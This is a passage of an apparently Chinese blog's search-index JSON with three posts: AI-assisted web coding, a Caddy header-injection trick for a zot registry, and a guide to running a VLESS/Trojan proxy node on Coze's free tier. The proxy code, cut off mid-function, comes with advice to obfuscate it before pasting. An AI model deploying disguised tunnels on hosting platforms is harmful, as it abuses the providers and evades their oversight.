class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e请你看一下这个api接口文档并测试一下哪些是有效的，帮我制作一个音乐播放web，需要有喜欢，最近播放，以及用户创立。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260109205633630\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109205633630.png\"\u003e\u003c/p\u003e\n\u003cp\u003e让它运行，打开页面看看\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109205602177.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后claude装好skills，Apple-Hig-Designer，地址是：https://github.com/axiaoge2/Apple-Hig-Designer\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e分析当前项目，Using apple-hig-desiner skills 重新设计前端页面\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e代开claude\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109213225642\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109213225642.png\"\u003e\u003c/p\u003e\n\u003cp\u003e回答几个问题\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109214524286\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109214524286.png\"\u003e\u003c/p\u003e\n\u003cp\u003e确定方案后开始改造\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109214319378\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109214319378.png\"\u003e\u003c/p\u003e\n\u003cp\u003e牛B吹得挺大：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109215440343\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109215440343.png\"\u003e\u003c/p\u003e\n\u003cp\u003e打开一看，250啊\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109215509968\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109215509968.png\"\u003e\u003c/p\u003e\n\u003cp\u003e啥狗屁玩意，继续修去\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;link \u003cspan class=\"nv\"\u003erel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;stylesheet\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/.claude/skills/Apple-Hig-Designer/resources/design-tokens.css\u0026#34;\u003c/span\u003e /\u0026gt; 无法访问 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260109215604573\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109215604573.png\"\u003e\u003c/p\u003e\n\u003cp\u003e刷新，擦的，图标都是错的\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109215929241\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109215929241.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e顶栏的图标都是错的\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260109215902092\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109215902092.png\"\u003e\u003c/p\u003e\n\u003cp\u003e修好后再看\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109220249764\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109220249764.png\"\u003e\u003c/p\u003e\n\u003cp\u003e确实是苹果风格，点开设置，又拉跨了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109220335982\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109220335982.png\"\u003e\u003c/p\u003e\n\u003cp\u003e继续命令它改：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e设置，齿轮按钮打开后，配置窗口跑到最左面了，没有在右边\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260109220506425\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109220506425.png\"\u003e\u003c/p\u003e\n\u003cp\u003e擦的，什么玩意，放中央，简直了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109220448088\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109220448088.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e弹窗放到按钮附近\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260109220956519\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109220956519.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最终还可以，但是。\u003c/p\u003e\n\u003cp\u003e感觉这个skills还没有codex原生生成的好看。\u003c/p\u003e\n\u003cp\u003e编程基本变成了口嗨的行为了，真的是脑洞大开。\u003c/p\u003e","title":"如何用codex、claude code混合口嗨编程"},{"content":"公司有两个docker的registry，一个是在公司内网，一个是在hk的公网\n那jenkins打镜像的时候，FROM底包是在hk，打出镜像后，又要推到公司的内网，这样jenkins的pipeline看起来就很痛苦\n打包登录公网一次，打包的地址是内网的harbor，推包再登录内网一次，脚本如下：\ndocker.withRegistry(\u0026#34;https://hk.rendoumi.com\u0026#34;, \u0026#34;hk-user\u0026#34;) { image = docker.build(\u0026#34;harbor.rendoumi.dev/${IMAGE_NAME}:${TAG}\u0026#34;, \u0026#34;${PROJECT_PATH}\u0026#34;) } docker.withRegistry(\u0026#34;https://harbor.rendoumi.dev\u0026#34;, \u0026#34;harbor-user\u0026#34;) { if (image) { image.push() } } 流水线不多的话这么还行得通，流水线很多，就得改个一溜够\n那就想如果登录hk的服务器使用白名单机制，公司的jenkins worknodes服务器去访问，就不用登录，直接访问，就好了\n那公司私网的registry是用的harbor搭的，公网的registry用的caddy+zot搭建\n问了下 Gemini， 结果非常的荒谬，居然出现幻觉，呓推出了zot根本不存在的ip白名单限制规则，简直了！！！\n后来跑到 zot 的官网看了半天文档，发现不行，根本没有这种配置\n那就只能从Caddy入手了，从公司jenkins worknode出来的ip先到Caddy\n然后Caddy模拟登录信息，给后端的zot发请求，就可以通过了\n做法如下：\n首先把 hk registry 的用户名和密码生成base64字串，得到XXXXX的BASE64字符串\necho -n \u0026#34;user1:pass1\u0026#34; | base64 然后修改Caddyfile，原有的配置\nhk.rendoumi.com { reverse_proxy 127.0.0.1:5000 { header_up X-Real-IP {remote_host} transport http { dial_timeout 15s response_header_timeout 300s } } } 改成如下：\nhk.rendoumi.com { @trusted { remote_ip 111.222.333.444 } handle @trusted { reverse_proxy 127.0.0.1:5000 { header_up Authorization \u0026#34;Basic XXXXXXXXXXXXXXXX\u0026#34; header_up X-Real-IP {remote_host} transport http { dial_timeout 15s response_header_timeout 300s } } } handle { reverse_proxy 127.0.0.1:5000 { header_up X-Real-IP {remote_host} transport http { dial_timeout 15s response_header_timeout 300s } } } } 解释一下，上面如果是 111.222.333.444 的ip来访问，那就模拟登录的 Head 头信息，如果不是，就直接放行，由后端的zot进行验证\n那相应的，后端的zot也必须采用httpasswd的认证方式，zot的config.json配置如下：\n{ \u0026#34;distSpecVersion\u0026#34;: \u0026#34;1.0.0-dev\u0026#34;, \u0026#34;http\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: \u0026#34;5000\u0026#34;, \u0026#34;compat\u0026#34;: [\u0026#34;docker2s2\u0026#34;], \u0026#34;auth\u0026#34;: { \u0026#34;htpasswd\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/zot/htpasswd\u0026#34; } } }, \u0026#34;storage\u0026#34;: { \u0026#34;rootDirectory\u0026#34;: \u0026#34;/zot/registry\u0026#34; } } 这样就OK了\n","permalink":"https://rendoumi.com/posts/20260109-caddy_zot/","summary":"\u003cp\u003e公司有两个docker的registry，一个是在公司内网，一个是在hk的公网\u003c/p\u003e\n\u003cp\u003e那jenkins打镜像的时候，FROM底包是在hk，打出镜像后，又要推到公司的内网，这样jenkins的pipeline看起来就很痛苦\u003c/p\u003e\n\u003cp\u003e打包登录公网一次，打包的地址是内网的harbor，推包再登录内网一次，脚本如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker.withRegistry\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://hk.rendoumi.com\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;hk-user\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003eimage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e docker.build\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;harbor.rendoumi.dev/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIMAGE_NAME\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eTAG\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePROJECT_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker.withRegistry\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://harbor.rendoumi.dev\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;harbor-user\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eimage\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e image.push\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e流水线不多的话这么还行得通，流水线很多，就得改个一溜够\u003c/p\u003e\n\u003cp\u003e那就想如果登录hk的服务器使用白名单机制，公司的jenkins worknodes服务器去访问，就不用登录，直接访问，就好了\u003c/p\u003e\n\u003cp\u003e那公司私网的registry是用的harbor搭的，公网的registry用的caddy+zot搭建\u003c/p\u003e\n\u003cp\u003e问了下 Gemini， 结果非常的荒谬，居然出现幻觉，呓推出了zot根本不存在的ip白名单限制规则，简直了！！！\u003c/p\u003e\n\u003cp\u003e后来跑到 zot 的官网看了半天文档，发现不行，根本没有这种配置\u003c/p\u003e\n\u003cp\u003e那就只能从Caddy入手了，从公司jenkins worknode出来的ip先到Caddy\u003c/p\u003e\n\u003cp\u003e然后Caddy模拟登录信息，给后端的zot发请求，就可以通过了\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003cp\u003e首先把 hk registry 的用户名和密码生成base64字串，得到XXXXX的BASE64字符串\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;user1:pass1\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后修改Caddyfile，原有的配置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehk.rendoumi.com \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    reverse_proxy 127.0.0.1:5000 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        header_up X-Real-IP \u003cspan class=\"o\"\u003e{\u003c/span\u003eremote_host\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        transport http \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dial_timeout 15s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            response_header_timeout 300s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e改成如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehk.rendoumi.com \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    @trusted \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        remote_ip 111.222.333.444\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    handle @trusted \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reverse_proxy 127.0.0.1:5000 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            header_up Authorization \u003cspan class=\"s2\"\u003e\u0026#34;Basic XXXXXXXXXXXXXXXX\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            header_up X-Real-IP \u003cspan class=\"o\"\u003e{\u003c/span\u003eremote_host\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transport http \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                dial_timeout 15s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                response_header_timeout 300s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    handle \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reverse_proxy 127.0.0.1:5000 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            header_up X-Real-IP \u003cspan class=\"o\"\u003e{\u003c/span\u003eremote_host\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transport http \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                dial_timeout 15s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                response_header_timeout 300s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下，上面如果是 111.222.333.444 的ip来访问，那就模拟登录的 Head 头信息，如果不是，就直接放行，由后端的zot进行验证\u003c/p\u003e","title":"Caddy配合zot实现ip白名单登录docker registry"},{"content":"前几天佬友说扣子编程出了一个免费版，所以也想薅一把\n事先声明：扣子编程是国内的，所以无法翻墙，本质也是一个容器。能做一个代理隐藏IP来访问国内的网站。\n所以，说老实话，自己很少有这个场景来使用\n废话不多说，直接开始:\n扣子编程的网址：https://code.coze.cn\n本质是火山引擎旗下的东西，也是一个容器，而且吧，比较有意思，跟 claude 和 codex 差不多\n基本是：讲述式编程方式，一天智能建3个项目，一个项目是1cpu，2G内存\n打开网站，新建项目，然后点击网页应用，下面的文本输入框就是编程的地方了：\n我们先让它自己生成一个应用，再在生成的基础上进行修改，直接硬来会有无穷的麻烦，它有自己固定的架构\n建立一个极简的nodejs程序，不依赖任何前端和后端框架，不要用到next框架。前端页面是index.html，里面是Hello world，主程序是index.js，用来显示index.html的内容，绝对不要用到任何js框架。 然后系统就叽里呱啦、哔哔赖赖开始自己搞了，它缺省创立的项目无论你再怎么强调，都是基于next.js的，都会拉出一坨next的屎，所以会神经兮兮的思考来思考去，产生一堆废物，我们可以不用理他\n然后显示正常\n从上图我们得到几个关键信息：\n端口是5000 文件夹可以看到文件，里面有一堆缺省的配置，就算强调，依然有next拉的屎 部署按钮，我们部署测试一下 按部署按钮，会得到一个域名\n然后部署成功，点击箭头\n打开后，就是我们想要的\n我们记下来这个域名，大善人啊，免费域名和免费证书\n然后回到文件夹，来修改三个文件，index.html 和 index.js 和 package.json\n先来改 package.json, 在dependencies中，加两句，注意这两句的上一句需要加个逗号，axios最后没有逗号\n\u0026#34;ws\u0026#34;: \u0026#34;^8.14.2\u0026#34;, \u0026#34;axios\u0026#34;: \u0026#34;^1.12.2\u0026#34; 注意：写到最后，发现这里可以再部署一下再改index.jsp和index.html比较好，就不用经历我下面的回档了！！！！！\n我下面是没有再部署，直接硬改，点开文件夹图标，选中index.js，先别贴，需要修改混淆的：\nconst http = require(\u0026#39;http\u0026#39;); const https = require(\u0026#39;https\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const dns = require(\u0026#39;dns\u0026#39;); const axios = require(\u0026#39;axios\u0026#39;); const net = require(\u0026#39;net\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const { Buffer } = require(\u0026#39;buffer\u0026#39;); const { WebSocket, createWebSocketStream } = require(\u0026#39;ws\u0026#39;); // 生成 UUID v4 function generateUUID() { return crypto.randomUUID(); } const UUID = process.env.UUID || generateUUID(); const DOMAIN = process.env.DOMAIN || \u0026#39;xxxxxxxx.coze.site\u0026#39;; // 填写项目域名 const WSPATH = process.env.WSPATH || UUID.slice(0, 8); // 节点路径，默认获取uuid前8位 const SUB_PATH = process.env.SUB_PATH || \u0026#39;sub\u0026#39;; // 节点的订阅路径 const NAME = process.env.NAME || \u0026#39;\u0026#39;; // 节点名称 const PORT = process.env.PORT || 5000; // http和ws服务端口 const TLS_KEY_PATH = process.env.TLS_KEY_PATH || \u0026#39;\u0026#39;; const TLS_CERT_PATH = process.env.TLS_CERT_PATH || \u0026#39;\u0026#39;; let ISP = \u0026#39;\u0026#39;; const GetISP = async () =\u0026gt; { try { const res = await axios.get(\u0026#39;https://api.ip.sb/geoip\u0026#39;); const data = res.data; ISP = `${data.country_code}-${data.isp}`.replace(/ /g, \u0026#39;_\u0026#39;); } catch (e) { ISP = \u0026#39;Unknown\u0026#39;; } } GetISP(); function normalizeSecret(value) { if (!value) return \u0026#39;\u0026#39;; return value.includes(\u0026#39;\\\\n\u0026#39;) ? value.replace(/\\\\n/g, \u0026#39;\\n\u0026#39;) : value; } function readOptionalFile(filePath) { if (!filePath) return \u0026#39;\u0026#39;; const resolvedPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath); try { return fs.readFileSync(resolvedPath, \u0026#39;utf8\u0026#39;); } catch (error) { console.warn(`Failed to read TLS file ${resolvedPath}: ${error.message}`); return \u0026#39;\u0026#39;; } } function getTLSOptions() { let key = normalizeSecret(process.env.TLS_KEY); let cert = normalizeSecret(process.env.TLS_CERT); if (!key) { key = readOptionalFile(TLS_KEY_PATH); } if (!cert) { cert = readOptionalFile(TLS_CERT_PATH); } if (key \u0026amp;\u0026amp; cert) { return { key, cert }; } if (key || cert) { console.warn(\u0026#39;Both TLS key and certificate are required; falling back to HTTP.\u0026#39;); } return null; } const requestHandler = (req, res) =\u0026gt; { if (req.url === \u0026#39;/\u0026#39;) { const filePath = path.join(__dirname, \u0026#39;index.html\u0026#39;); fs.readFile(filePath, \u0026#39;utf8\u0026#39;, (err, content) =\u0026gt; { if (err) { res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(\u0026#39;Hello world!\u0026#39;); return; } res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(content); }); return; } else if (req.url === `/${SUB_PATH}`) { const namePart = NAME ? `${NAME}-${ISP}` : ISP; const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none\u0026amp;security=tls\u0026amp;sni=${DOMAIN}\u0026amp;fp=chrome\u0026amp;type=ws\u0026amp;host=${DOMAIN}\u0026amp;path=%2F${WSPATH}#${namePart}`; const trojanURL = `trojan://${UUID}@${DOMAIN}:443?security=tls\u0026amp;sni=${DOMAIN}\u0026amp;fp=chrome\u0026amp;type=ws\u0026amp;host=${DOMAIN}\u0026amp;path=%2F${WSPATH}#${namePart}`; const subscription = vlessURL + \u0026#39;\\n\u0026#39; + trojanURL; const base64Content = Buffer.from(subscription).toString(\u0026#39;base64\u0026#39;); res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(base64Content + \u0026#39;\\n\u0026#39;); } else { res.writeHead(404, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;Not Found\\n\u0026#39;); } }; const tlsOptions = getTLSOptions(); const httpServer = tlsOptions ? https.createServer(tlsOptions, requestHandler) : http.createServer(requestHandler); const wss = new WebSocket.Server({ server: httpServer }); const uuid = UUID.replace(/-/g, \u0026#34;\u0026#34;); const DNS_SERVERS = [\u0026#39;114.114.114.114\u0026#39;, \u0026#39;223.5.5.5\u0026#39;]; // Custom DNS async function resolveHost(host) { const target = String(host || \u0026#39;\u0026#39;).trim(); if (!target) throw new Error(\u0026#39;Host is empty\u0026#39;); if (net.isIP(target)) return target; try { const addresses = await dns.promises.lookup(target, { all: true }); const preferred = addresses.find(a =\u0026gt; a.family === 4) || addresses[0]; if (preferred?.address) return preferred.address; } catch (_) { // fall through to custom DNS servers } const resolver = new dns.promises.Resolver(); for (const server of DNS_SERVERS) { try { resolver.setServers([server]); const v4 = await resolver.resolve4(target); if (v4?.[0]) return v4[0]; } catch (_) {} try { resolver.setServers([server]); const v6 = await resolver.resolve6(target); if (v6?.[0]) return v6[0]; } catch (_) {} } throw new Error(`Failed to resolve ${target}`); } // VLE-SS处理 function handleVlessConnection(ws, msg) { const [VERSION] = msg; const id = msg.slice(1, 17); if (!id.every((v, i) =\u0026gt; v == parseInt(uuid.substr(i * 2, 2), 16))) return false; let i = msg.slice(17, 18).readUInt8() + 19; const port = msg.slice(i, i += 2).readUInt16BE(0); const ATYP = msg.slice(i, i += 1).readUInt8(); const host = ATYP == 1 ? msg.slice(i, i += 4).join(\u0026#39;.\u0026#39;) : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) =\u0026gt; (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b =\u0026gt; b.readUInt16BE(0).toString(16)).join(\u0026#39;:\u0026#39;) : \u0026#39;\u0026#39;)); ws.send(new Uint8Array([VERSION, 0])); const duplex = createWebSocketStream(ws); resolveHost(host) .then(resolvedIP =\u0026gt; { net.connect({ host: resolvedIP, port }, function() { this.write(msg.slice(i)); duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }) .catch(error =\u0026gt; { 